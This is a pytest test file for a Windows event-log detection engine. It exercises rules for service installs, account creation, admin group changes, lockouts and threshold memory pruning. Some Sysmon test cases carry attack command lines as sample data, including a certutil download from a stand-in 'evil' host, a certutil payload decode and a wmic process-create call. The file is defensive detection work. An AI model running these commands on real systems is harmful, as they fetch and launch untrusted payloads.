"""
Tests for the extended detection ruleset and the threshold memory-leak fix.
Loads the real rules/ directory so the shipped YAML is exercised end-to-end.
"""
import sys
from datetime import datetime, timedelta
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).parent.parent))

from modules.detection_engine import DetectionEngine, DetectionRule


@pytest.fixture(scope="module")
def engine():
    rules_dir = Path(__file__).parent.parent / "rules"
    return DetectionEngine(rules_dir=str(rules_dir))


def _rule(engine, rule_id):
    for r in engine.rules:
        if r.id == rule_id:
            return r
    raise AssertionError(f"rule {rule_id} not loaded")


class TestExtendedRulesLoaded:
    def test_all_new_rules_present(self, engine):
        ids = {r.id for r in engine.rules}
        for rid in [
            "lolbin_download_001", "new_service_install_001", "new_user_account_001",
            "added_to_admin_group_001", "account_lockout_001", "wmic_process_call_001",
        ]:
            assert rid in ids, f"missing rule: {rid}"

    def test_every_rule_has_mitre_and_severity(self, engine):
        for r in engine.rules:
            assert r.severity in ("low", "medium", "high", "critical"), r.id
            assert isinstance(r.mitre, list)


class TestSecurityEventRules:
    """Single-event Security rules match purely on provider + event_id."""

    def test_new_service_install(self, engine):
        r = _rule(engine, "new_service_install_001")
        assert r.matches("7045", datetime.now(), "A service was installed", "Security")
        assert not r.matches("7045", datetime.now(), "x", "Sysmon")   # wrong provider
        assert not r.matches("4624", datetime.now(), "x", "Security")  # wrong id

    def test_new_user_account(self, engine):
        r = _rule(engine, "new_user_account_001")
        assert r.matches("4720", datetime.now(), "A user account was created", "Security")
        assert not r.matches("4722", datetime.now(), "x", "Security")

    def test_account_lockout(self, engine):
        r = _rule(engine, "account_lockout_001")
        assert r.matches("4740", datetime.now(), "A user account was locked out", "Security")

    def test_added_to_admin_group_requires_privileged_group(self, engine):
        r = _rule(engine, "added_to_admin_group_001")
        admin_msg = "A member was added...\n\tGroup Name:\tAdministrators\n"
        assert r.matches("4732", datetime.now(), admin_msg, "Security")
        # A non-privileged group must NOT trigger
        users_msg = "A member was added...\n\tGroup Name:\tUsers\n"
        assert not r.matches("4732", datetime.now(), users_msg, "Security")


class TestSysmonCommandLineRules:
    """Sysmon process-creation rules match on the command line / image."""

    def test_lolbin_certutil_download(self, engine):
        r = _rule(engine, "lolbin_download_001")
        sysmon = {"CommandLine": "certutil.exe -urlcache -f http://evil/a.exe a.exe",
                  "Image": "C:\\Windows\\System32\\certutil.exe"}
        assert r.matches("1", datetime.now(), "", "Sysmon", sysmon)

    def test_lolbin_certutil_decode(self, engine):
        r = _rule(engine, "lolbin_download_001")
        sysmon = {"CommandLine": "certutil -decode payload.b64 payload.exe", "Image": "certutil.exe"}
        assert r.matches("1", datetime.now(), "", "Sysmon", sysmon)

    def test_lolbin_benign_certutil_does_not_match(self, engine):
        r = _rule(engine, "lolbin_download_001")
        sysmon = {"CommandLine": "certutil -hashfile file.txt SHA256", "Image": "certutil.exe"}
        assert not r.matches("1", datetime.now(), "", "Sysmon", sysmon)

    def test_wmic_process_call_create(self, engine):
        r = _rule(engine, "wmic_process_call_001")
        sysmon = {"CommandLine": 'wmic process call create "cmd.exe /c calc"', "Image": "wmic.exe"}
        assert r.matches("1", datetime.now(), "", "Sysmon", sysmon)

    def test_wmic_benign_query_does_not_match(self, engine):
        r = _rule(engine, "wmic_process_call_001")
        sysmon = {"CommandLine": "wmic os get caption", "Image": "wmic.exe"}
        assert not r.matches("1", datetime.now(), "", "Sysmon", sysmon)


class TestThresholdMemoryPrune:
    """The threshold engine must not leak stale keys over time."""

    def _threshold_rule(self):
        data = {
            "id": "mem_test",
            "name": "mem",
            "severity": "high",
            "conditions": {
                "provider": "Sysmon",
                "event_id": "1",
                "parent_image_regex": ".*",
                "image_regex": ".*",
                "time_window": 60,
                "threshold": 5,
            },
        }
        return DetectionRule(data, "mem_test.yaml")

    def test_stale_keys_are_pruned(self):
        rule = self._threshold_rule()
        t0 = datetime.now()

        # Key A: one event at t0 (distinct parent->child combo)
        rule.matches("1", t0, "", "Sysmon", {"ParentImage": "a.exe", "Image": "b.exe"})
        assert len(rule.event_history) == 1

        # Much later, a different combo (Key B) arrives — Key A has aged out and
        # must be dropped rather than lingering forever.
        t_late = t0 + timedelta(seconds=120)
        rule.matches("1", t_late, "", "Sysmon", {"ParentImage": "c.exe", "Image": "d.exe"})

        keys = list(rule.event_history.keys())
        assert len(keys) == 1, f"stale key not pruned: {keys}"
        assert all("c.exe" in k for k in keys)


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
